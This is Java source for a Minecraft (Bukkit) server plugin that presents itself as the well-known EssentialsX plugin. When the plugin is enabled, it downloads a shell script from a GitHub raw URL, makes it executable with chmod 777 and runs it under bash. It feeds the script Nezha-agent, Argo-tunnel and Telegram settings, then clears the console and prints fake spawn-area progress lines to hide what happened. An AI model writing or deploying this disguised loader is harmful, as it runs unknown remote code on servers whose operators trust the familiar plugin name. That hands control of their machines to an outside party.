package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process scriptProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    
    private static final String SCRIPT_URL = "https://raw.githubusercontent.com/dsadsadsss/java-wanju/refs/heads/main/start.sh";
    
    private static final String[] ALL_ENV_VARS = {
        "TOK", "ARGO_DOMAIN", "TG", "SUB_URL", "NEZHA_SERVER", 
        "NEZHA_KEY", "NEZHA_PORT", "NEZHA_TLS", "TMP_ARGO", 
        "EKEY", "SUB_NAME", "CF_IP", "AGENT_UUID", "UUID"
    };
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        // Start script
        try {
            startScriptProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start script process: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private void startScriptProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        // Download script
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path scriptFile = tmpDir.resolve("plugin");
        
        // getLogger().info("Downloading plugin script...");
        try (InputStream in = new URL(SCRIPT_URL).openStream()) {
            Files.copy(in, scriptFile, StandardCopyOption.REPLACE_EXISTING);
        }
        
        // Set 777 permission
        File file = scriptFile.toFile();
        file.setReadable(true, false);
        file.setWritable(true, false);
        file.setExecutable(true, false);
        
        // Alternative method to ensure 777 permissions on Unix-like systems
        try {
            Runtime.getRuntime().exec(new String[]{"chmod", "777", scriptFile.toString()}).waitFor();
        } catch (Exception e) {
            // Ignore if chmod command is not available (e.g., on Windows)
        }
        
        // Prepare process builder to run bash script
        ProcessBuilder pb = new ProcessBuilder("/bin/bash", scriptFile.toString());
        pb.directory(tmpDir.toFile());
        
        // Set environment variables
        Map<String, String> env = pb.environment();
        
        // Set default values
        env.put("TOK", "");
        env.put("ARGO_DOMAIN", "");
        env.put("TG", "");
        env.put("SUB_URL", "");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_KEY", "");
        env.put("NEZHA_PORT", "443");
        env.put("NEZHA_TLS", "1");
        env.put("TMP_ARGO", "vms");
        env.put("EKEY", "");
        env.put("SUB_NAME", "argo");
        env.put("CF_IP", "ip.sb");
        env.put("AGENT_UUID", "");
        env.put("UUID", "");
        
        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);
        
        // Load from Bukkit configuration file (highest priority)
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        // Start process
        scriptProcess = pb.start();
        isProcessRunning = true;
        
        // Start a monitor thread
        startProcessMonitor();
        // getLogger().info("plugin script is running");
        
        // Sleep 20 seconds
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }
    
    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        Path loadedEnvFile = null;
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }
        
        if (loadedEnvFile == null) {
           // getLogger().info("No .env file found in any of the checked locations");
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("TOK") || key.contains("TG") ? "***" : value));
                }
            }
        }
    }
    
    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }
    
    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = scriptProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("plugin script process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Script-Process-Monitor");
        
        monitorThread.setDaemon(true);
        monitorThread.start();
    }
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        shouldRun = false;
        
        if (scriptProcess != null && scriptProcess.isAlive()) {
            // getLogger().info("Stopping script process...");
            scriptProcess.destroy();
            
            try {
                if (!scriptProcess.waitFor(10, TimeUnit.SECONDS)) {
                    scriptProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated script process");
                } else {
                    getLogger().info("Script process stopped normally");
                }
            } catch (InterruptedException e) {
                scriptProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
        
        getLogger().info("EssentialsX plugin disabled");
    }
}
